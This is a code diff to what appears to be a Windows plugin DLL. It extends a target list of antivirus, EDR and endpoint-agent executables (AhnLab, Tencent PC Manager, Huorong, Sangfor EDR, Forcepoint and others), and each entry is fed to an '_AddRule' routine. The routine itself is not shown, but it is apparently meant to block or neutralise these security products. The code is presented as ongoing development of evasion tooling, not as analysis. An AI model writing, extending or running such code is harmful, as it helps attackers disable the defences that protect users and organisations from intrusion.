@@ -121,6 +121,51 @@ extern "C" __declspec(dllexport) BOOL WINAPI PluginMain(void){
         // Qihoo 360 Total Security
         L"%ProgramFiles%\\360\\Total Security\\QHSafeSvc.exe",
         L"%ProgramFiles(x86)%\\360\\Total Security\\QHSafeSvc.exe",
+        // AhnLab V3 Internet Security
+        L"%ProgramFiles%\\AhnLab\\V3 Internet Security\\V3SP.exe",
+        // K7 Computing Total Security
+        L"%ProgramFiles%\\K7 Computing\\K7 Total Security\\K7TSecurity.exe",
+        // Kingsoft Internet Security
+        L"%ProgramFiles%\\Kingsoft Internet Security\\KIS.exe",
+        L"%ProgramFiles(x86)%\\Kingsoft Internet Security\\kis.exe",
+        // Tencent PC Manager (QQPCMgr)
+        L"%ProgramFiles(x86)%\\Tencent\\QQPCMgr\\Main\\QQPCTray.exe",
+        // Quick Heal Antivirus
+        L"%ProgramFiles%\\Quick Heal\\Quick Heal Antivirus\\scanner.exe",
+        // Rising Antivirus (瑞星)
+        L"%ProgramFiles%\\Rising\\RSD\\RSD_PFW.exe",
+        // eScan / MicroWorld
+        L"%ProgramFiles%\\MicroWorld\\eScan\\MWAGENT.exe",
+        // Seqrite Endpoint Security
+        L"%ProgramFiles%\\Seqrite\\Endpoint Security\\SRTasks.exe",
+        // Huorong Internet Security (火绒)
+        L"%ProgramFiles%\\Huorong\\Sysdiag\\usysdiag.exe",
+        // Jiangmin KV Antivirus
+        L"%ProgramFiles%\\Jiangmin\\KV Antivirus\\KVMonXP.exe",
+        // PC Matic
+        L"%ProgramFiles%\\PC Matic\\PCMatic.exe",
+        // VBA32 / VirusBlokAda
+        L"%ProgramFiles%\\VBA32\\vba32loader.exe",
+        // Total Defense Internet Security
+        L"%ProgramFiles%\\Total Defense\\Total Defense Internet Security Suite\\TDCCore.exe",
+        // Acronis Cyber Protect
+        L"%ProgramFiles%\\Acronis\\Cyber Protect\\BackgroundAgent.exe",
+        // Smadav
+        L"%ProgramFiles%\\SmadAV\\SmadAV.exe",
+        // Bkav Pro
+        L"%ProgramFiles%\\Bkav Pro\\BkavService.exe",
+        // Gridinsoft Anti-Malware
+        L"%ProgramFiles%\\GridinSoft Anti-Malware\\gsam.exe",
+        // TotalAV
+        L"%ProgramFiles%\\TotalAV\\TotalAVSrv.exe",
+        // Zemana AntiMalware
+        L"%ProgramFiles%\\Zemana\\AntiMalware\\Zemana.AntiMalware.exe",
+        // Sangfor EDR (Chinese enterprise)
+        L"%ProgramFiles%\\Sangfor\\EDR\\SangforEDR.exe",
+        // ManageEngine Desktop Central Agent
+        L"%ProgramFiles%\\ManageEngine\\DesktopCentral_Agent\\bin\\dcagentservice.exe",
+        // Forcepoint One Endpoint
+        L"%ProgramFiles%\\Forcepoint\\Endpoint\\fp_agent.exe",
     };
     DWORD n=sizeof(targets)/sizeof(targets[0]);
     for(DWORD i=0;i<n;i++)_AddRule(sys,targets[i],(int)i);
